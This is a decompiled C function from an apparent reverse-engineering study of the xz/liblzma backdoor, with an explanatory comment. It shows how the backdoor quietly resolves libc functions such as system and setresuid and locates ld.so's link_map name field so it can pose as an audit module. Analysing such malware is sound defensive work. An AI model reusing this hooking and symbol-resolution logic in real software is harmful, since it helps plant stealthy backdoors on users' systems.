// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
// Function: find_link_map_l_name @ 0x104080
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_name(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Locates the live `link_map::l_name` byte inside ld.so and gathers the libc/libcrypto imports needed later in the run. It
 * piggybacks on the fake `lzma_alloc` resolver to look up `exit`, `setlogmask`, `setresgid`, `setresuid`, `system`, `shutdown`,
 * and `BN_num_bits`, then walks the cached liblzma link_map snapshot inside the binary until it finds the entry whose RELRO tuple
 * matches the running liblzma image. The resulting displacement becomes both `*libname_offset` and the pointer used to index
 * `hooks->ldso_ctx.libcrypto_l_name`, and the helper double-checks that `_dl_audit_symbind_alt` references the same offset so
 * later code can safely rewrite the `l_name` field when posing as an audit module.
 */

#include "xzre_types.h"

BOOL find_link_map_l_name
               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  elf_info_t *ldso_elf;
  link_map *candidate_map;
  dl_audit_symbind_alt_fn code_start;
  BOOL BVar4;
  uint uVar5;
  lzma_allocator *allocator;
  pfn_exit_t ppVar6;
  pfn_setlogmask_t ppVar7;
  pfn_setresgid_t ppVar8;
  lzma_allocator *allocator_00;
  Elf64_Sym *pEVar9;
  pfn_BN_num_bits_t ppVar10;
  uchar *code_start_00;
  pfn_setresuid_t ppVar11;
  pfn_system_t ppVar12;
  pfn_shutdown_t ppVar13;
  link_map *snapshot_entry;
  link_map *runtime_entry;
  u64 displacement;
  link_map *snapshot_iter;
  link_map *relro_limit;
  link_map *liblzma_snapshot;
  
  BVar4 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
  if (BVar4 != FALSE) {
    libc_imports = imported_funcs->libc;
    liblzma_snapshot = data_handle->data->liblzma_map;
    allocator = get_lzma_allocator();
    allocator->opaque = data_handle->elf_handles->libc;
    ppVar6 = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
    libc_imports->exit = ppVar6;
    if (ppVar6 != (pfn_exit_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    ppVar7 = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
    libc_imports->setlogmask = ppVar7;
    if (ppVar7 != (pfn_setlogmask_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    ppVar8 = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
    libc_imports->setresgid = ppVar8;
    if (ppVar8 != (pfn_setresgid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    allocator_00 = get_lzma_allocator();
    ldso_elf = data_handle->elf_handles->dynamic_linker;
    allocator_00->opaque = data_handle->elf_handles->libcrypto;
    pEVar9 = elf_symbol_get(ldso_elf,STR_dl_audit_preinit,0);
    if (pEVar9 != (Elf64_Sym *)0x0) {
      ppVar10 = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,allocator_00);
      imported_funcs->BN_num_bits = ppVar10;
      if (ppVar10 != (pfn_BN_num_bits_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      ldso_elf = data_handle->elf_handles->dynamic_linker;
      code_start_00 = ldso_elf->elfbase->e_ident + pEVar9->st_value;
      BVar4 = elf_contains_vaddr(ldso_elf,code_start_00,pEVar9->st_size,4);
      snapshot_iter = liblzma_snapshot + 0x960;
      if (BVar4 != FALSE) {
LAB_001041f0:
        if (liblzma_snapshot != snapshot_iter) {
          ldso_elf = data_handle->elf_handles->liblzma;
          if ((*(u64 *)liblzma_snapshot != ldso_elf->gnurelro_vaddr) ||
             (*(u64 *)(liblzma_snapshot + 8) != ldso_elf->gnurelro_memsize)) goto LAB_001041ec;
          snapshot_entry = (link_map *)0x0;
          runtime_entry = (link_map *)0xffffffffffffffff;
          for (snapshot_iter = data_handle->data->liblzma_map; snapshot_iter < liblzma_snapshot + 0x18;
              snapshot_iter = snapshot_iter + 8) {
            candidate_map = *(link_map **)snapshot_iter;
            if (liblzma_snapshot + 0x18 <= candidate_map) {
              relro_limit = runtime_entry;
              if (liblzma_snapshot + 0x68 <= runtime_entry) {
                relro_limit = liblzma_snapshot + 0x68;
              }
              if (candidate_map < relro_limit) {
                snapshot_entry = snapshot_iter;
                runtime_entry = candidate_map;
              }
            }
          }
          if (runtime_entry != (link_map *)0xffffffffffffffff) {
            allocator->opaque = data_handle->elf_handles->libc;
            ppVar11 = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
            libc_imports->setresuid = ppVar11;
            if (ppVar11 != (pfn_setresuid_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            liblzma_snapshot = data_handle->data->liblzma_map;
            displacement = (long)runtime_entry - (long)liblzma_snapshot;
            uVar5 = (int)liblzma_snapshot - (int)snapshot_entry;
            if (liblzma_snapshot <= snapshot_entry) {
              uVar5 = (int)snapshot_entry - (int)liblzma_snapshot;
            }
            (hooks->ldso_ctx).libcrypto_l_name = (char **)(data_handle->data->libcrypto_map + uVar5)
            ;
            BVar4 = find_lea_instruction(code_start_00,code_start_00 + pEVar9->st_size,displacement)
            ;
            if (BVar4 == FALSE) {
              return FALSE;
            }
            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
            BVar4 = find_lea_instruction
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                               displacement);
            if (BVar4 == FALSE) {
              return FALSE;
            }
            allocator->opaque = data_handle->elf_handles->libc;
            ppVar12 = (pfn_system_t)lzma_alloc(0x9f8,allocator);
            libc_imports->system = ppVar12;
            if (ppVar12 != (pfn_system_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            ppVar13 = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
            libc_imports->shutdown = ppVar13;
            if (ppVar13 != (pfn_shutdown_t)0x0) {
              libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
            }
            allocator_00->opaque = data_handle->elf_handles->libcrypto;
            *libname_offset = displacement;
            return TRUE;
          }
        }
      }
      lzma_free(imported_funcs->BN_num_bits,allocator_00);
    }
  }
  return FALSE;
LAB_001041ec:
  liblzma_snapshot = liblzma_snapshot + 8;
  goto LAB_001041f0;
}

